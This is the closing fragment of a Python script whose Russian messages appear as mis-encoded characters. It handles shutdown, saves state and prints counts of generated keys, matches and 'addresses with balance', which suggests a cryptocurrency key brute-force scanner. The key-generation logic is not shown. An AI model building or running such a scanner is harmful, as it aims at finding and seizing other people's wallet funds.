                print(Fore.YELLOW + "\n–û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã..." + Style.RESET_ALL)
                logger.info("–ü—Ä–æ–≥—Ä–∞–º–º–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
                save_state(stats['keys_generated'])
                await save_stats(method, mode_names[check_mode], group)
                print(Fore.GREEN + f"–û–±—Ä–∞–±–æ—Ç–∞–Ω–æ –∫–ª—é—á–µ–π: {stats['keys_generated']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–π (—Ñ–∞–π–ª): {stats['matches_file']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"–°–æ–≤–ø–∞–¥–µ–Ω–∏–π (API): {stats['matches_api']}" + Style.RESET_ALL)
                print(Fore.GREEN + f"–ê–¥—Ä–µ—Å–æ–≤ —Å –±–∞–ª–∞–Ω—Å–æ–º: {stats['addresses_with_balance']}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"–û—à–∏–±–∫–∞ –≤ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–µ–π: {e}" + Style.RESET_ALL)
                logger.error(f"–û—à–∏–±–∫–∞ –≤ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–µ–π: {e}")
                save_state(stats['keys_generated'])
                await save_stats(method, mode_names[check_mode], group)
    except Exception as e:
        print(Fore.RED + f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã: {e}" + Style.RESET_ALL)
        logger.error(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã: {e}")
        exit(1)
if __name__ == "__main__":
    asyncio.run(main())        